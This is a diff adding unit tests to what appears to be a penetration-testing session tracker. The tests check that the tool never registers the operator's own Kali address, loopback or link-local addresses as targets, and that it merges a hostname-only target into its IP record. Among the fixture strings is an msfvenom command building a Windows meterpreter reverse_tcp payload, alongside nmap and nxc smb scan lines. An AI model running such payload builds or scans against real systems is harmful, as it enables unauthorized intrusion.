@@ -154,5 +154,62 @@ ok(forced.hosts.length === 1 && forced.hosts[0] === '10.0.0.99', 'a fixed target
 ok(OBOL.store._scoped['host:10.0.0.99'] && OBOL.store._scoped['host:10.0.0.99'].has('ports.open') && OBOL.store._scoped['host:10.0.0.99'].has('host.hostname'),
   'with a fixed target, both commands\' facts file under the chosen host');
 
+// ── 6. the Kali VM is never a target ─────────────────────────────────────────────────────────────────
+// detectTarget with a self-IP set: even if the operator's own box appears as a command argument (they
+// nmap'd their own IP, or ran a listener), it must not be routed to as a target.
+ok(OBOL.ingest.detectTarget('nmap -Pn 10.10.14.9', '', { self: ['10.10.14.9'] }) === '', 'a scan of the operator\'s OWN VM IP routes nowhere (not a target)');
+ok(OBOL.ingest.detectTarget('nxc smb 10.0.0.5', '', { self: ['10.10.14.9'] }) === '10.0.0.5', 'a real target beside a known self-IP still routes correctly');
+ok(OBOL.ingest.detectTarget('ping 127.0.0.1', '', {}) === '', 'loopback is never a target');
+ok(OBOL.ingest.detectTarget('nmap 169.254.1.1', '', {}) === '', 'a link-local address is never a target');
+ok(OBOL.ingest.detectTarget('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=443 -f exe', '', {}) === '', 'the LHOST= value in a payload build is not a target');
+
+// A full-import self-IP guard: an `ip a` interface dump reveals the box's own addresses; a later nmap of
+// one of those must not create a Kali target. Fresh store.
+OBOL.store = (function () {
+  var eng = { params: { domain: 'corp.local', target: '10.0.0.5' }, targets: [{ id: 't1', ip: '10.0.0.5' }], activities: [], facts: [] };
+  var byScope = {};
+  function fs(scope) { return byScope[scope] || (byScope[scope] = new OBOL.facts.FactSet([])); }
+  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
+    addFacts: function (facts) { var n = 0; (facts || []).forEach(function (f) { if (fs(f.scope).add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; }); return n; },
+    factSet: function () { return fs('host:' + eng.params.target); }, _scoped: byScope, _e: eng };
+})();
+var withSelf = [
+  '└─$ ip a', '2: eth0: <BROADCAST> mtu 1500', '    inet 192.168.56.101/24 brd 192.168.56.255 scope global eth0',
+  '4: tun0: <POINTOPOINT> mtu 1500', '    inet 10.10.14.9/23 scope global tun0',
+  '└─$ nmap -Pn 192.168.56.101', 'Nmap scan report for 192.168.56.101', 'Host is up.', 'PORT STATE SERVICE', '22/tcp open ssh',
+].join('\n');
+var selfRes = OBOL.ingest.importSession(withSelf);
+ok(selfRes.hosts.indexOf('192.168.56.101') < 0 && selfRes.hosts.indexOf('10.10.14.9') < 0, 'importing a session that scans the box\'s OWN eth0 IP never routes it as a host');
+ok(!OBOL.store._e.targets.some(function (t) { return t.ip === '192.168.56.101' || t.ip === '10.10.14.9'; }), 'no Kali interface address was registered as a target');
+
+// ── 7. reconcile a hostname-only target into the IP record ────────────────────────────────────────────
+OBOL.store = (function () {
+  var eng = { params: { domain: 'corp.local', target: '' }, targets: [{ id: 'manual', ip: '', hostname: 'DC01' }], activities: [], facts: [] };
+  var byScope = {};
+  function fs(scope) { return byScope[scope] || (byScope[scope] = new OBOL.facts.FactSet([])); }
+  return { active: function () { return eng; }, update: function (fn) { fn(eng); },
+    addFacts: function (facts) {
+      var n = 0; (facts || []).forEach(function (f) { if (fs(f.scope).add(OBOL.facts.factFromJson(OBOL.facts.factToJson(f)))) n++; });
+      // mirror the real store: keep a flat eng.facts list (reconcile reads it) + hostname sync onto IP targets
+      eng.facts = []; Object.keys(byScope).forEach(function (sc) { byScope[sc].facts.forEach(function (f) { eng.facts.push(OBOL.facts.factToJson(f)); }); });
+      var SUP = OBOL.facts.ProofState.SUPPORTED;
+      eng.facts.map(OBOL.facts.factFromJson).forEach(function (f) {
+        if ((f.kind === 'host.hostname' || f.kind === 'host.fqdn') && f.state === SUP && String(f.scope).indexOf('host:') === 0) {
+          var ip = f.scope.slice(5), nm = String((f.value || {}).name || (f.value || {}).hostname || '').split('.')[0];
+          if (nm) (eng.targets || []).forEach(function (tg) { if (tg.ip === ip && !tg.hostname) tg.hostname = nm; });
+        }
+      });
+      return n;
+    },
+    factSet: function () { return fs('host:' + (eng.params.target || 'x')); }, _e: eng };
+})();
+// a capture that proves DC01 == 10.0.0.5 (nxc smb names the host)
+var reconCap = ['└─$ nxc smb 10.0.0.5', 'SMB 10.0.0.5 445 DC01 [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)'].join('\n');
+var rec = OBOL.ingest.importSession(reconCap);
+var tgts = OBOL.store._e.targets;
+ok(tgts.length === 1, 'the hostname-only card and the auto-created IP card collapse into ONE (got ' + tgts.length + ')');
+ok(tgts[0].ip === '10.0.0.5' && String(tgts[0].hostname).toLowerCase() === 'dc01', 'the surviving card has both the IP and the hostname (' + tgts[0].ip + ' / ' + tgts[0].hostname + ')');
+ok(rec.merged === 1, 'importSession reports 1 duplicate target merged');
+
 console.log(fail ? ('\nSESSION IMPORT: ' + fail + ' FAILURES') : '\nSESSION IMPORT: all passed');
 process.exit(fail ? 1 : 0);
